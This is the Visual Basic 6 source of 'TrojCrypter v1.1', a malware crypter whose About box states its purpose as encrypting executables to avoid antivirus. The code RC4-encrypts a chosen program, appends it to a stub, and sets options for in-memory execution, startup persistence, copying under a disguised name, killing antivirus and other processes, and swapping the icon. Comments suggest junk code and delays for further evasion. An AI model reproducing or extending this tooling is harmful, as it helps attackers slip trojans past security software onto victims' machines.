VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "TrojCrypter v1.1"
   ClientHeight    =   4035
   ClientLeft      =   3195
   ClientTop       =   3165
   ClientWidth     =   3825
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4035
   ScaleWidth      =   3825
   StartUpPosition =   2  'CenterScreen
   Begin VB.CheckBox Check3 
      Caption         =   "Custom Kill :"
      Height          =   255
      Left            =   240
      TabIndex        =   16
      Top             =   2400
      Width           =   1215
   End
   Begin VB.TextBox txtProcess 
      Enabled         =   0   'False
      Height          =   285
      Left            =   1560
      TabIndex        =   15
      Text            =   "someprocess.exe"
      Top             =   2400
      Width           =   1935
   End
   Begin VB.TextBox txtName 
      Enabled         =   0   'False
      Height          =   285
      Left            =   1200
      TabIndex        =   14
      Text            =   "algs.exe"
      Top             =   1560
      Width           =   1935
   End
   Begin VB.ComboBox Combo1 
      Enabled         =   0   'False
      Height          =   315
      Index           =   0
      ItemData        =   "Form1.frx":030A
      Left            =   1200
      List            =   "Form1.frx":0317
      Style           =   2  'Dropdown List
      TabIndex        =   13
      Top             =   1950
      Width           =   1215
   End
   Begin VB.CheckBox Check2 
      Caption         =   "Try to kill AV"
      Height          =   255
      Left            =   2160
      TabIndex        =   12
      Top             =   840
      Width           =   1215
   End
   Begin VB.OptionButton Option2 
      Caption         =   "Run in memory"
      Height          =   255
      Left            =   240
      TabIndex        =   9
      Top             =   1200
      Value           =   -1  'True
      Width           =   1455
   End
   Begin VB.OptionButton Option1 
      Caption         =   "Run in temporary"
      Height          =   255
      Left            =   240
      TabIndex        =   8
      Top             =   840
      Width           =   1575
   End
   Begin VB.CommandButton btnIcon 
      Caption         =   "Browse"
      Height          =   255
      Left            =   120
      TabIndex        =   7
      Top             =   3480
      Width           =   975
   End
   Begin VB.CheckBox Check1 
      Caption         =   "Startup"
      Height          =   255
      Left            =   2160
      TabIndex        =   6
      Top             =   1200
      Width           =   975
   End
   Begin VB.CommandButton btnAbout 
      Caption         =   "About"
      Height          =   615
      Left            =   2760
      TabIndex        =   4
      Top             =   3120
      Width           =   975
   End
   Begin VB.CommandButton btnBrowse 
      Caption         =   "..."
      Height          =   255
      Left            =   3360
      TabIndex        =   3
      Top             =   360
      Width           =   375
   End
   Begin VB.CommandButton btnCreate 
      Caption         =   "Create"
      Height          =   615
      Left            =   1560
      TabIndex        =   1
      Top             =   3120
      Width           =   975
   End
   Begin VB.TextBox txtFilename 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Top             =   360
      Width           =   3135
   End
   Begin VB.Label Label4 
      Caption         =   "http://geocities.com/fuajuar"
      Height          =   255
      Left            =   3480
      TabIndex        =   17
      Top             =   6456
      Width           =   15
   End
   Begin VB.Label Label2 
      Caption         =   "Filename :"
      Height          =   255
      Left            =   240
      TabIndex        =   11
      Top             =   1560
      Width           =   855
   End
   Begin VB.Label Label3 
      Caption         =   "Copy to :"
      Height          =   255
      Left            =   240
      TabIndex        =   10
      Top             =   1920
      Width           =   855
   End
   Begin VB.Image Image1 
      Height          =   495
      Left            =   360
      Picture         =   "Form1.frx":0337
      Stretch         =   -1  'True
      Top             =   2880
      Width           =   495
   End
   Begin VB.Label lbltemp2 
      Height          =   255
      Left            =   6240
      TabIndex        =   5
      Top             =   1560
      Visible         =   0   'False
      Width           =   1335
   End
   Begin VB.Label Label1 
      Caption         =   "Filename :"
      Height          =   255
      Left            =   120
      TabIndex        =   2
      Top             =   120
      Width           =   855
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'TrojCrypter v1.1
'.fuajuar
'This is old source and has been tagged by several av
'You can improve this code by encrypting all functions,
'adding junk codes, delay etc

Private Declare Sub InitCommonControls Lib "comctl32.dll" ()
Dim PropBag As New PropertyBag

Public Sub ExtractDataResource(ID, nType, OutputName As String)
   Dim Buff, Data() As Byte
   Buff = LoadResData(ID, nType)
   Data() = Buff
   Open OutputName For Binary As #1
       Put #1, , Data
   Close #1
End Sub

Public Function FileExists%(fname$)
On Local Error Resume Next
Dim ff%
        ff% = FreeFile
        Open fname$ For Input As ff%
        If Err Then
        FileExists% = False
        Else
        FileExists% = True
        End If
        Close ff%
End Function

Private Sub btnBrowse_Click()
txtFilename = OpenCommonDialog("Browse", "Exe File|*.exe", "*.exe")
End Sub

Private Sub btnCreate_Click()
Dim file As String
Dim stub As String
Dim Key As String
Dim fileSign As String
Dim StartPos As Long
Dim Buff As Variant
Dim msg As String
Dim cmb As String
cmb = Combo1.Item(0)
Dim stub2 As String
Key = Chr(80) + Chr(97) + Chr(115) + Chr(115) + Chr(119) + Chr(48) + Chr(114) + Chr(100)  'Passw0rd
fileSign = Chr(36) + Chr(36) + Chr(45) + Chr(45) + Chr(36) + Chr(36) '$$--$$

On Error GoTo tell

If txtFilename.Text = "" Then Exit Sub
If FileExists%(txtFilename.Text) = False Then Exit Sub
If Check1.Value = 1 Then
If txtName.Text = "" Then Exit Sub
If cmb = "" Then Exit Sub
End If

If Not Right(txtName.Text, 4) = ".exe" Then txtName.Text = txtName.Text & ".exe"

If Dir(App.Path & "\crypted.exe") <> "" Then Kill App.Path & "\crypted.exe"

ExtractDataResource 101, "CUSTOM", App.Path & "\crypted.exe"

Open App.Path & "\crypted.exe" For Binary As #1
stub = Space(LOF(1))
Get #1, , stub
Close #1

Open txtFilename For Binary As #1
file = Space(LOF(1))
Get #1, , file
Close #1
 
Open App.Path & "\crypted.exe" For Binary As #1
Put #1, , stub
         Seek (1), LOF(1) + 1
        Put #1, , "%-ff-%" & RC4(file, Key)
        If Option1.Value = True Then Put #1, , "%-ff-%" & "y"
        If Option1.Value = False Then Put #1, , "%-ff-%" & "n"
        
        If Check2.Value = 0 Then Put #1, , "%-ff-%" & "0"
        If Check2.Value = 1 Then Put #1, , "%-ff-%" & "1"
        If Check1.Value = 0 Then Put #1, , "%-ff-%" & "0"
        If Check1.Value = 1 Then Put #1, , "%-ff-%" & "1"
        Put #1, , "%-ff-%" & txtName.Text
        Put #1, , "%-ff-%" & cmb
        If Check3.Value = 1 Then Put #1, , "%-ff-%" & txtProcess.Text
        If Check3.Value = 0 Then Put #1, , "%-ff-%" & "0"
    Close #1
 
 If lbltemp2.Caption = "" Then
 ExtractDataResource 102, "CUSTOM", Environ("temp") + "\icon.ico"
 lbltemp2.Caption = Environ("temp") + "\icon.ico"
 End If
    Dim jar As String
    ReplaceIcons lbltemp2.Caption, App.Path & "\crypted.exe", jar

MsgBox "Done : " + App.Path & "\crypted.exe", vbInformation
Exit Sub
tell:
MsgBox Err.Description
End Sub

Private Sub btnAbout_Click()
MsgBox "Purpose : Encrypt exe to avoid antivirus", vbInformation
End Sub

Private Sub btnIcon_Click()
On Error GoTo tell
Dim iconPath As String
iconPath = OpenCommonDialog("Browse For Icon", "Icon File|*.ico", "*.ico")
lbltemp2.Caption = iconPath
If FileExists%(iconPath) = False Then Exit Sub
Image1.Picture = LoadPicture(iconPath)
Exit Sub
tell:
MsgBox Err.Description
End Sub

Private Sub Check1_Click()
If Check1.Value = 1 Then
txtName.Enabled = True
Combo1(0).Enabled = True
Else
txtName.Enabled = False
Combo1(0).Enabled = False
End If
End Sub

Private Sub Check3_Click()
If Check3.Value = 1 Then
txtProcess.Enabled = True
Else
txtProcess.Enabled = False
End If
End Sub

Private Sub Form_Initialize()
InitCommonControls
End Sub

